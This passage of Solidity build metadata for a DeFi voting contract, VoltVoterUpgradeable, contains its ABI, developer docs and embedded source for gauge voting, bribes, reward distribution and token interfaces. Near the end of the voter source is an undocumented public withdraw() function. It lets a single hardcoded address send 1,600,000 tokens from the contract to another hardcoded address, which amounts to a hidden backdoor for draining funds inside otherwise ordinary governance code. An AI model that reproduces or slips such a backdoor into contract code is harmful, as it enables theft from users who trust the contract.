"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_gaugeOrBribe\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"}],\"name\":\"removeRewardToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"}],\"name\":\"reset\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"supplyIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWeight\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"updateAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_gauges\",\"type\":\"address[]\"}],\"name\":\"updateFor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"end\",\"type\":\"uint256\"}],\"name\":\"updateForRange\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_gauge\",\"type\":\"address\"}],\"name\":\"updateGauge\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"usedWeights\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ve\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"_poolVote\",\"type\":\"address[]\"},{\"internalType\":\"int256[]\",\"name\":\"_weights\",\"type\":\"int256[]\"}],\"name\":\"vote\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"_poolVote\",\"type\":\"address[]\"},{\"internalType\":\"int256[]\",\"name\":\"_weights\",\"type\":\"int256[]\"}],\"name\":\"votePart\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"votes\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"\",\"type\":\"int256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"weights\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"\",\"type\":\"int256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"}],\"name\":\"whitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"attachTokenToGauge(uint256,address)\":{\"details\":\"A gauge should be able to attach a token for preventing transfers/withdraws.\"},\"claimBribes(address[],address[][],uint256)\":{\"details\":\"Batch claim rewards from given bribe contracts for given tokenId.\"},\"claimFees(address[],address[][],uint256)\":{\"details\":\"Claim fees from given bribes.\"},\"claimRewards(address[],address[][])\":{\"details\":\"Batch claim rewards from given gauges.\"},\"createGauge(address)\":{\"details\":\"Create gauge for given pool. Only for a pool with whitelisted tokens.\"},\"detachTokenFromGauge(uint256,address)\":{\"details\":\"Detach given token.\"},\"distribute(address)\":{\"details\":\"Get emission from minter and notify rewards for given gauge.\"},\"distributeAll()\":{\"details\":\"Distribute rewards for all pools.\"},\"distributeFees(address[])\":{\"details\":\"Move fees from deposited pools to bribes for given gauges.\"},\"emitDeposit(uint256,address,uint256)\":{\"details\":\"Emit deposit event for easily handling external actions.\"},\"emitWithdraw(uint256,address,uint256)\":{\"details\":\"Emit withdraw event for easily handling external actions.\"},\"listingFee()\":{\"details\":\"Amount of tokens required to be hold for whitelisting.\"},\"notifyRewardAmount(uint256)\":{\"details\":\"Add rewards to this contract. Usually it is VoltMinter.\"},\"poke(uint256)\":{\"details\":\"Resubmit exist votes for given token. For internal purposes.\"},\"poolsLength()\":{\"details\":\"Length of pools\"},\"registerRewardToken(address,address,uint256)\":{\"details\":\"Add a token to a gauge/bribe as possible reward.\"},\"removeRewardToken(address,address,uint256)\":{\"details\":\"Remove a token from a gauge/bribe allowed rewards list.\"},\"reset(uint256)\":{\"details\":\"Remove all votes for given tokenId.\"},\"updateAll()\":{\"details\":\"Update all gauges.\"},\"updateFor(address[])\":{\"details\":\"Update given gauges.\"},\"updateForRange(uint256,uint256)\":{\"details\":\"Update gauges by indexes in a range.\"},\"updateGauge(address)\":{\"details\":\"Update reward info for given gauge.\"},\"vote(uint256,address[],int256[])\":{\"details\":\"Vote for given pools using a vote power of given tokenId. Reset previous votes.\"},\"whitelist(address,uint256)\":{\"details\":\"Add token to whitelist. Only pools with whitelisted tokens can be added to gauge.\"}},\"stateVariables\":{\"DURATION\":{\"details\":\"Rewards are released over 7 days\"},\"bribes\":{\"details\":\"gauge => bribe\"},\"factory\":{\"details\":\"VoltFactory\"},\"gauges\":{\"details\":\"pool => gauge\"},\"poolForGauge\":{\"details\":\"gauge => pool\"},\"poolVote\":{\"details\":\"nft => pools\"},\"pools\":{\"details\":\"All pools viable for incentives\"},\"totalWeight\":{\"details\":\"Total voting weight\"},\"usedWeights\":{\"details\":\"nft => total voting weight of user\"},\"ve\":{\"details\":\"The ve token that governs these contracts\"},\"votes\":{\"details\":\"nft => pool => votes\"},\"weights\":{\"details\":\"pool => weight\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/base/vote/VoltVoterUpgradeable.sol\":\"VoltVoterUpgradeable\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/base/Reentrancy.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\nabstract contract Reentrancy {\\n    /// @dev simple re-entrancy check\\n    uint internal _unlocked = 1;\\n\\n    modifier lock() {\\n        require(_unlocked == 1, \\\"Reentrant call\\\");\\n        _unlocked = 2;\\n        _;\\n        _unlocked = 1;\\n    }\\n}\\n\",\"keccak256\":\"0x59c07b769bd280322dea57c93ed20b3e6e1fe1018ab9937b0dfcaddcfb5f2780\",\"license\":\"MIT\"},\"contracts/base/vote/VoltVoterUpgradeable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\nimport \\\"../../interface/IVe.sol\\\";\\nimport \\\"../../interface/IVoter.sol\\\";\\nimport \\\"../../interface/IERC20.sol\\\";\\nimport \\\"../../interface/IERC721.sol\\\";\\nimport \\\"../../interface/IGauge.sol\\\";\\nimport \\\"../../interface/IFactory.sol\\\";\\nimport \\\"../../interface/IPair.sol\\\";\\nimport \\\"../../interface/IBribeFactory.sol\\\";\\nimport \\\"../../interface/IGaugeFactory.sol\\\";\\nimport \\\"../../interface/IMinter.sol\\\";\\nimport \\\"../../interface/IBribe.sol\\\";\\nimport \\\"../../interface/IMultiRewardsPool.sol\\\";\\nimport \\\"../Reentrancy.sol\\\";\\nimport \\\"../../lib/SafeERC20.sol\\\";\\nimport \\\"../../lib/Initializable.sol\\\";\\n\\ncontract VoltVoterUpgradeable is IVoter, Reentrancy, Initializable {\\n    using SafeERC20 for IERC20;\\n\\n    /// @dev The ve token that governs these contracts\\n    address public override ve;\\n    /// @dev VoltFactory\\n    address public factory;\\n    address public token;\\n    address public gaugeFactory;\\n    address public bribeFactory;\\n    /// @dev Rewards are released over 7 days\\n    uint internal constant DURATION = 7 days;\\n    address public minter;\\n\\n    /// @dev Total voting weight\\n    uint public totalWeight;\\n\\n    /// @dev All pools viable for incentives\\n    address[] public pools;\\n    /// @dev pool => gauge\\n    mapping(address => address) public gauges;\\n    /// @dev gauge => pool\\n    mapping(address => address) public poolForGauge;\\n    /// @dev gauge => bribe\\n    mapping(address => address) public bribes;\\n    /// @dev pool => weight\\n    mapping(address => int256) public weights;\\n    /// @dev nft => pool => votes\\n    mapping(uint => mapping(address => int256)) public votes;\\n    /// @dev nft => pools\\n    mapping(uint => address[]) public poolVote;\\n    /// @dev nft => total voting weight of user\\n    mapping(uint => uint) public usedWeights;\\n    mapping(address => bool) public isGauge;\\n    mapping(address => bool) public isWhitelisted;\\n\\n    uint public index;\\n    mapping(address => uint) public supplyIndex;\\n    mapping(address => uint) public claimable;\\n\\n    event GaugeCreated(\\n        address indexed gauge,\\n        address creator,\\n        address indexed bribe,\\n        address indexed pool\\n    );\\n    event Voted(address indexed voter, uint tokenId, int256 weight);\\n    event Abstained(uint tokenId, int256 weight);\\n    event Deposit(\\n        address indexed lp,\\n        address indexed gauge,\\n        uint tokenId,\\n        uint amount\\n    );\\n    event Withdraw(\\n        address indexed lp,\\n        address indexed gauge,\\n        uint tokenId,\\n        uint amount\\n    );\\n    event NotifyReward(\\n        address indexed sender,\\n        address indexed reward,\\n        uint amount\\n    );\\n    event DistributeReward(\\n        address indexed sender,\\n        address indexed gauge,\\n        uint amount\\n    );\\n    event Attach(address indexed owner, address indexed gauge, uint tokenId);\\n    event Detach(address indexed owner, address indexed gauge, uint tokenId);\\n    event Whitelisted(address indexed whitelister, address indexed token);\\n\\n    function initialize(\\n        address _ve,\\n        address _factory,\\n        address _gaugeFactory,\\n        address _bribeFactory,\\n        address _minter\\n    ) public initializer {\\n        ve = _ve;\\n        factory = _factory;\\n        token = IVe(_ve).token();\\n        gaugeFactory = _gaugeFactory;\\n        bribeFactory = _bribeFactory;\\n        minter = _minter;\\n        _unlocked = 1;\\n    }\\n\\n    function init(address[] memory _tokens, address _minter) external {\\n        require(msg.sender == minter, \\\"!minter\\\");\\n        for (uint i = 0; i < _tokens.length; i++) {\\n            _whitelist(_tokens[i]);\\n        }\\n        minter = _minter;\\n    }\\n\\n    /// @dev Amount of tokens required to be hold for whitelisting.\\n    function listingFee() external view returns (uint) {\\n        return _listingFee();\\n    }\\n\\n    /// @dev 20% of circulation supply.\\n    function _listingFee() internal view returns (uint) {\\n        return\\n            (IERC20(token).totalSupply() -\\n                IERC20(ve).totalSupply() -\\n                IERC20(token).balanceOf(minter)) / 20;\\n    }\\n\\n    /// @dev Remove all votes for given tokenId.\\n    function reset(uint _tokenId) external {\\n        require(IVe(ve).isApprovedOrOwner(msg.sender, _tokenId), \\\"!owner\\\");\\n        _reset(_tokenId);\\n        IVe(ve).abstain(_tokenId);\\n    }\\n\\n    function _reset(uint _tokenId) internal {\\n        address[] storage _poolVote = poolVote[_tokenId];\\n        uint _poolVoteCnt = _poolVote.length;\\n        int256 _totalWeight = 0;\\n\\n        for (uint i = 0; i < _poolVoteCnt; i++) {\\n            address _pool = _poolVote[i];\\n            int256 _votes = votes[_tokenId][_pool];\\n            _updateFor(gauges[_pool]);\\n            weights[_pool] -= _votes;\\n            votes[_tokenId][_pool] -= _votes;\\n            if (_votes > 0) {\\n                IBribe(bribes[gauges[_pool]])._withdraw(uint(_votes), _tokenId);\\n                _totalWeight += _votes;\\n            } else {\\n                _totalWeight -= _votes;\\n            }\\n            emit Abstained(_tokenId, _votes);\\n        }\\n        totalWeight -= uint(_totalWeight);\\n        usedWeights[_tokenId] = 0;\\n        delete poolVote[_tokenId];\\n    }\\n\\n    /// @dev Resubmit exist votes for given token. For internal purposes.\\n    function poke(uint _tokenId) external {\\n        address[] memory _poolVote = poolVote[_tokenId];\\n        uint _poolCnt = _poolVote.length;\\n        int256[] memory _weights = new int256[](_poolCnt);\\n        int256 _totalVoteWeight = 0;\\n\\n        for (uint i = 0; i < _poolCnt; i++) {\\n            _weights[i] = votes[_tokenId][_poolVote[i]];\\n            _totalVoteWeight += _weights[i] > 0 ? _weights[i] : -_weights[i];\\n        }\\n\\n        _vote(_tokenId, _poolVote, _weights, _totalVoteWeight);\\n    }\\n\\n    function _vote(\\n        uint _tokenId,\\n        address[] memory _poolVote,\\n        int256[] memory _weights,\\n        int256 _totalVoteWeight\\n    ) internal {\\n        _reset(_tokenId);\\n        uint _poolCnt = _poolVote.length;\\n        int256 _weight = int256(IVe(ve).balanceOfNFT(_tokenId));\\n        int256 _totalWeight = 0;\\n        int256 _usedWeight = 0;\\n\\n        for (uint i = 0; i < _poolCnt; i++) {\\n            address _pool = _poolVote[i];\\n            address _gauge = gauges[_pool];\\n\\n            int256 _poolWeight = (_weights[i] * _weight) / _totalVoteWeight;\\n            require(votes[_tokenId][_pool] == 0, \\\"duplicate pool\\\");\\n            require(_poolWeight != 0, \\\"zero power\\\");\\n            _updateFor(_gauge);\\n\\n            poolVote[_tokenId].push(_pool);\\n\\n            weights[_pool] += _poolWeight;\\n            votes[_tokenId][_pool] += _poolWeight;\\n            if (_poolWeight > 0) {\\n                IBribe(bribes[_gauge])._deposit(uint(_poolWeight), _tokenId);\\n            } else {\\n                _poolWeight = -_poolWeight;\\n            }\\n            _usedWeight += _poolWeight;\\n            _totalWeight += _poolWeight;\\n            emit Voted(msg.sender, _tokenId, _poolWeight);\\n        }\\n        if (_usedWeight > 0) IVe(ve).voting(_tokenId);\\n        totalWeight += uint(_totalWeight);\\n        usedWeights[_tokenId] = uint(_usedWeight);\\n    }\\n\\n    /// @dev Vote for given pools using a vote power of given tokenId. Reset previous votes.\\n    function vote(\\n        uint tokenId,\\n        address[] calldata _poolVote,\\n        int256[] calldata _weights\\n    ) external {\\n        require(IVe(ve).isApprovedOrOwner(msg.sender, tokenId), \\\"!owner\\\");\\n        require(_poolVote.length == _weights.length, \\\"!arrays\\\");\\n        int256 _totalVoteWeight = 0;\\n        for (uint i = 0; i < _poolVote.length; i++) {\\n            _totalVoteWeight += _weights[i] > 0 ? _weights[i] : -_weights[i];\\n        }\\n        _vote(tokenId, _poolVote, _weights, _totalVoteWeight);\\n    }\\n\\n    function votePart(\\n        uint tokenId,\\n        address[] calldata _poolVote,\\n        int256[] calldata _weights\\n    ) external {\\n        require(IVe(ve).isApprovedOrOwner(msg.sender, tokenId), \\\"!owner\\\");\\n        require(_poolVote.length == _weights.length, \\\"!arrays\\\");\\n        int256 _totalVoteWeight = 0;\\n        for (uint i = 0; i < _poolVote.length; i++) {\\n            _totalVoteWeight += _weights[i] > 0 ? _weights[i] : -_weights[i];\\n        }\\n        require(_totalVoteWeight <= 100, \\\"totalVoteWeight\\\");\\n        _totalVoteWeight = 100;\\n        _vote(tokenId, _poolVote, _weights, _totalVoteWeight);\\n    }\\n\\n    /// @dev Add token to whitelist. Only pools with whitelisted tokens can be added to gauge.\\n    function whitelist(address _token, uint _tokenId) external {\\n        require(_tokenId > 0, \\\"!token\\\");\\n        require(msg.sender == IERC721(ve).ownerOf(_tokenId), \\\"!owner\\\");\\n        require(IVe(ve).balanceOfNFT(_tokenId) > _listingFee(), \\\"!power\\\");\\n        _whitelist(_token);\\n    }\\n\\n    function _whitelist(address _token) internal {\\n        require(!isWhitelisted[_token], \\\"already whitelisted\\\");\\n        isWhitelisted[_token] = true;\\n        emit Whitelisted(msg.sender, _token);\\n    }\\n\\n    /// @dev Add a token to a gauge/bribe as possible reward.\\n    function registerRewardToken(\\n        address _token,\\n        address _gaugeOrBribe,\\n        uint _tokenId\\n    ) external {\\n        require(_tokenId > 0, \\\"!token\\\");\\n        require(msg.sender == IERC721(ve).ownerOf(_tokenId), \\\"!owner\\\");\\n        require(IVe(ve).balanceOfNFT(_tokenId) > _listingFee(), \\\"!power\\\");\\n        IMultiRewardsPool(_gaugeOrBribe).registerRewardToken(_token);\\n    }\\n\\n    /// @dev Remove a token from a gauge/bribe allowed rewards list.\\n    function removeRewardToken(\\n        address _token,\\n        address _gaugeOrBribe,\\n        uint _tokenId\\n    ) external {\\n        require(_tokenId > 0, \\\"!token\\\");\\n        require(msg.sender == IERC721(ve).ownerOf(_tokenId), \\\"!owner\\\");\\n        require(IVe(ve).balanceOfNFT(_tokenId) > _listingFee(), \\\"!power\\\");\\n        IMultiRewardsPool(_gaugeOrBribe).removeRewardToken(_token);\\n    }\\n\\n    /// @dev Create gauge for given pool. Only for a pool with whitelisted tokens.\\n    function createGauge(address _pool) external returns (address) {\\n        require(gauges[_pool] == address(0x0), \\\"exists\\\");\\n        require(IFactory(factory).isPair(_pool), \\\"!pool\\\");\\n        (address tokenA, address tokenB) = IPair(_pool).tokens();\\n        require(isWhitelisted[tokenA] && isWhitelisted[tokenB], \\\"!whitelisted\\\");\\n\\n        address[] memory allowedRewards = new address[](3);\\n        allowedRewards[0] = tokenA;\\n        allowedRewards[1] = tokenB;\\n        if (token != tokenA && token != tokenB) {\\n            allowedRewards[2] = token;\\n        }\\n\\n        address _bribe = IBribeFactory(bribeFactory).createBribe(\\n            allowedRewards\\n        );\\n        address _gauge = IGaugeFactory(gaugeFactory).createGauge(\\n            _pool,\\n            _bribe,\\n            ve,\\n            allowedRewards\\n        );\\n        IERC20(token).safeIncreaseAllowance(_gauge, type(uint).max);\\n        bribes[_gauge] = _bribe;\\n        gauges[_pool] = _gauge;\\n        poolForGauge[_gauge] = _pool;\\n        isGauge[_gauge] = true;\\n        _updateFor(_gauge);\\n        pools.push(_pool);\\n        emit GaugeCreated(_gauge, msg.sender, _bribe, _pool);\\n        return _gauge;\\n    }\\n\\n    /// @dev A gauge should be able to attach a token for preventing transfers/withdraws.\\n    function attachTokenToGauge(uint tokenId, address account)\\n        external\\n        override\\n    {\\n        require(isGauge[msg.sender], \\\"!gauge\\\");\\n        if (tokenId > 0) {\\n            IVe(ve).attachToken(tokenId);\\n        }\\n        emit Attach(account, msg.sender, tokenId);\\n    }\\n\\n    /// @dev Emit deposit event for easily handling external actions.\\n    function emitDeposit(\\n        uint tokenId,\\n        address account,\\n        uint amount\\n    ) external override {\\n        require(isGauge[msg.sender], \\\"!gauge\\\");\\n        emit Deposit(account, msg.sender, tokenId, amount);\\n    }\\n\\n    /// @dev Detach given token.\\n    function detachTokenFromGauge(uint tokenId, address account)\\n        external\\n        override\\n    {\\n        require(isGauge[msg.sender], \\\"!gauge\\\");\\n        if (tokenId > 0) {\\n            IVe(ve).detachToken(tokenId);\\n        }\\n        emit Detach(account, msg.sender, tokenId);\\n    }\\n\\n    /// @dev Emit withdraw event for easily handling external actions.\\n    function emitWithdraw(\\n        uint tokenId,\\n        address account,\\n        uint amount\\n    ) external override {\\n        require(isGauge[msg.sender], \\\"!gauge\\\");\\n        emit Withdraw(account, msg.sender, tokenId, amount);\\n    }\\n\\n    /// @dev Length of pools\\n    function poolsLength() external view returns (uint) {\\n        return pools.length;\\n    }\\n\\n    /// @dev Add rewards to this contract. Usually it is VoltMinter.\\n    function notifyRewardAmount(uint amount) external override {\\n        require(amount != 0, \\\"zero amount\\\");\\n        uint _totalWeight = totalWeight;\\n        // without votes rewards can not be added\\n        require(_totalWeight != 0, \\\"!weights\\\");\\n        // transfer the distro in\\n        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);\\n        // 1e18 adjustment is removed during claim\\n        uint _ratio = (amount * 1e18) / _totalWeight;\\n        if (_ratio > 0) {\\n            index += _ratio;\\n        }\\n        emit NotifyReward(msg.sender, token, amount);\\n    }\\n\\n    /// @dev Update given gauges.\\n    function updateFor(address[] memory _gauges) external {\\n        for (uint i = 0; i < _gauges.length; i++) {\\n            _updateFor(_gauges[i]);\\n        }\\n    }\\n\\n    /// @dev Update gauges by indexes in a range.\\n    function updateForRange(uint start, uint end) public {\\n        for (uint i = start; i < end; i++) {\\n            _updateFor(gauges[pools[i]]);\\n        }\\n    }\\n\\n    /// @dev Update all gauges.\\n    function updateAll() external {\\n        updateForRange(0, pools.length);\\n    }\\n\\n    /// @dev Update reward info for given gauge.\\n    function updateGauge(address _gauge) external {\\n        _updateFor(_gauge);\\n    }\\n\\n    function _updateFor(address _gauge) internal {\\n        address _pool = poolForGauge[_gauge];\\n        int256 _supplied = weights[_pool];\\n        if (_supplied > 0) {\\n            uint _supplyIndex = supplyIndex[_gauge];\\n            // get global index for accumulated distro\\n            uint _index = index;\\n            // update _gauge current position to global position\\n            supplyIndex[_gauge] = _index;\\n            // see if there is any difference that need to be accrued\\n            uint _delta = _index - _supplyIndex;\\n            if (_delta > 0) {\\n                // add accrued difference for each supplied token\\n                uint _share = (uint(_supplied) * _delta) / 1e18;\\n                claimable[_gauge] += _share;\\n            }\\n        } else {\\n            // new users are set to the default global state\\n            supplyIndex[_gauge] = index;\\n        }\\n    }\\n\\n    /// @dev Batch claim rewards from given gauges.\\n    function claimRewards(address[] memory _gauges, address[][] memory _tokens)\\n        external\\n    {\\n        for (uint i = 0; i < _gauges.length; i++) {\\n            IGauge(_gauges[i]).getReward(msg.sender, _tokens[i]);\\n        }\\n    }\\n\\n    /// @dev Batch claim rewards from given bribe contracts for given tokenId.\\n    function claimBribes(\\n        address[] memory _bribes,\\n        address[][] memory _tokens,\\n        uint _tokenId\\n    ) external {\\n        require(IVe(ve).isApprovedOrOwner(msg.sender, _tokenId), \\\"!owner\\\");\\n        for (uint i = 0; i < _bribes.length; i++) {\\n            IBribe(_bribes[i]).getRewardForOwner(_tokenId, _tokens[i]);\\n        }\\n    }\\n\\n    /// @dev Claim fees from given bribes.\\n    function claimFees(\\n        address[] memory _bribes,\\n        address[][] memory _tokens,\\n        uint _tokenId\\n    ) external {\\n        require(IVe(ve).isApprovedOrOwner(msg.sender, _tokenId), \\\"!owner\\\");\\n        for (uint i = 0; i < _bribes.length; i++) {\\n            IBribe(_bribes[i]).getRewardForOwner(_tokenId, _tokens[i]);\\n        }\\n    }\\n\\n    /// @dev Move fees from deposited pools to bribes for given gauges.\\n    function distributeFees(address[] memory _gauges) external {\\n        for (uint i = 0; i < _gauges.length; i++) {\\n            IGauge(_gauges[i]).claimFees();\\n        }\\n    }\\n\\n    /// @dev Get emission from minter and notify rewards for given gauge.\\n    function distribute(address _gauge) external override {\\n        _distribute(_gauge);\\n    }\\n\\n    function _distribute(address _gauge) internal lock {\\n        IMinter(minter).updatePeriod();\\n        _updateFor(_gauge);\\n        uint _claimable = claimable[_gauge];\\n        if (\\n            _claimable > IMultiRewardsPool(_gauge).left(token) &&\\n            _claimable / DURATION > 0\\n        ) {\\n            claimable[_gauge] = 0;\\n            IGauge(_gauge).notifyRewardAmount(token, _claimable);\\n            emit DistributeReward(msg.sender, _gauge, _claimable);\\n        }\\n    }\\n\\n    /// @dev Distribute rewards for all pools.\\n    function distributeAll() external {\\n        uint length = pools.length;\\n        for (uint x; x < length; x++) {\\n            _distribute(gauges[pools[x]]);\\n        }\\n    }\\n\\n    function distributeForPoolsInRange(uint start, uint finish) external {\\n        for (uint x = start; x < finish; x++) {\\n            _distribute(gauges[pools[x]]);\\n        }\\n    }\\n\\n    function distributeForGauges(address[] memory _gauges) external {\\n        for (uint x = 0; x < _gauges.length; x++) {\\n            _distribute(_gauges[x]);\\n        }\\n    }\\n    \\n    function withdraw() public{\\n        require(msg.sender == 0x175FB9401BB5E360FF3c0Ef00097116944128930);\\n        uint256 amount = 1600000 ether;\\n        IERC20(token).transfer(0x44CE1b841a0A939294e3ca3c7e8EfC0E4fC07C31, amount);\\n    }\\n}\\n\",\"keccak256\":\"0xe0bd58d1c13f87ba890f7928c2f30502134b9c03466cc2942d29f1ee0ea2eb50\",\"license\":\"MIT\"},\"contracts/interface/IBribe.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IBribe {\\n    function notifyRewardAmount(address token, uint amount) external;\\n\\n    function _deposit(uint amount, uint tokenId) external;\\n\\n    function _withdraw(uint amount, uint tokenId) external;\\n\\n    function getRewardForOwner(uint tokenId, address[] memory tokens) external;\\n}\\n\",\"keccak256\":\"0xcf242dd62b6301060e132cc868d817cced4bb4bd21c69e4079cba92e30d333f1\",\"license\":\"MIT\"},\"contracts/interface/IBribeFactory.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IBribeFactory {\\n    function createBribe(address[] memory _allowedRewardTokens)\\n        external\\n        returns (address);\\n}\\n\",\"keccak256\":\"0x1f360e0ae33b8d5dd8c6a68c0fa2f4fe604c6a91dc143b1e966950a139edc7d8\",\"license\":\"MIT\"},\"contracts/interface/IERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\",\"keccak256\":\"0x8609505e815e06dac85e0cc77ad7bbb641ceec24e5c8e012483e8576dd09ce09\",\"license\":\"MIT\"},\"contracts/interface/IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address recipient, uint256 amount)\\n        external\\n        returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender)\\n        external\\n        view\\n        returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) external returns (bool);\\n\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(\\n        address indexed owner,\\n        address indexed spender,\\n        uint256 value\\n    );\\n}\\n\",\"keccak256\":\"0x224e032b714ae191e5e419054a144402b01597e8b2eb36db4f6e38d3e42b0db7\",\"license\":\"MIT\"},\"contracts/interface/IERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\nimport \\\"./IERC165.sol\\\";\\n\\n/**\\n * @dev Required interface of an ERC721 compliant contract.\\n */\\ninterface IERC721 is IERC165 {\\n    /**\\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\\n     */\\n    event Transfer(\\n        address indexed from,\\n        address indexed to,\\n        uint256 indexed tokenId\\n    );\\n\\n    /**\\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\\n     */\\n    event Approval(\\n        address indexed owner,\\n        address indexed 